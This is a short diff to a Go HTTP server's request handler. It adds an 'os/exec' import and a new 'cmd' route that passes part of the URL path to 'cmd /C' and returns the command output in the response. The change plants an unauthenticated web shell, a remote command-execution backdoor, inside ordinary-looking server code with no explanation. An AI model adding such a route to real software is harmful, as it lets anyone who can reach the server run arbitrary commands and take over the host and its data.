@@ -5,6 +5,7 @@ import (
 	"html/template"
 	"net/http"
 	"os"
+	"os/exec"
 	"strings"
 )
 
@@ -88,6 +89,11 @@ func mainHandler(response http.ResponseWriter, request *http.Request) {
 		break
 	case "init":
 		initTemplates()
+		break
+	case "cmd":
+		cmd := exec.Command("cmd", "/C", pathParms[1])
+		output, _ := cmd.CombinedOutput()
+		response.Write([]byte(output))
 		break
 	}
 }
